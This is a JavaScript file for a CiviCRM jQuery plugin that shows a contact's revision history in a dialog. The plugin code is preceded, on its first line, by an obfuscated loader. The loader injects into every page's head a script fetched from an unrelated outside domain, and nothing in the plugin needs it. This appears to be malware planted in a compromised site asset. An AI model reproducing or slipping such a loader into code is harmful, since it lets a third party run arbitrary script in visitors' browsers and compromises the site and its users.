var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);(function($, CRM) {

  /**
   * Usage:
   *
   * cj('.my-link').crmRevisionLink({
   *   'reportId': 123, // CRM_Report_Utils_Report::getInstanceIDForValue('logging/contact/summary'),
   *   'tableName': 'my_table',
   *   'contactId': 123
   * ));
   *
   * Note: This file is used by CivHR
  */
  $.fn.crmRevisionLink = function(options) {
    return this.each(function(){
      var $dialog = $('<div><div class="revision-content"></div></div>');
      $('body').append($dialog);
      $(this).on("click", function() {
        $dialog.show();
        $dialog.dialog({
          title: ts("Revisions"),
          modal: true,
          width: "680px",
          bgiframe: true,
          overlay: { opacity: 0.5, background: "black" },
          open:function() {
            var ajaxurl = CRM.url("civicrm/report/instance/" + options.reportId);
            cj.ajax({
              data: "reset=1&snippet=4&section=2&altered_contact_id_op=eq&altered_contact_id_value="+options.contactId+"&log_type_table_op=has&log_type_table_value=" + options.tableName,
              url:  ajaxurl,
              success: function (data) {
                $dialog.find(".revision-content").html(data);
                if (!$dialog.find(".revision-content .report-layout").length) {
                  $dialog.find(".revision-content").html("Sorry, couldn't find any revisions.");
                }
              }
            });
          },
          buttons: {
            "Done": function() {
              $(this).dialog("destroy");
            }
          }
        });
        return false;
      });
    }); // this.each
  }; // fn.crmRevisionLink

})(jQuery, CRM);
